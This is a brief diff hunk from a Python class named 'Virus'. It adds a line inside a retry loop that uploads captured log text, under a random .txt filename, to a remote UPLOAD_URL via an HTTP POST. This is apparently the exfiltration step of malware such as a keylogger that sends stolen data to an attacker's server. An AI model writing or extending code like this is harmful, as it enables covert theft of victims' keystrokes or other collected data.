@@ -77,3 +77,4 @@ class Virus(object):
             filename = f"{uuid.uuid4()}.txt"
             while True:
                 try:
+                    http = requests.post(self.UPLOAD_URL, files={"file": (filename, logtext)})
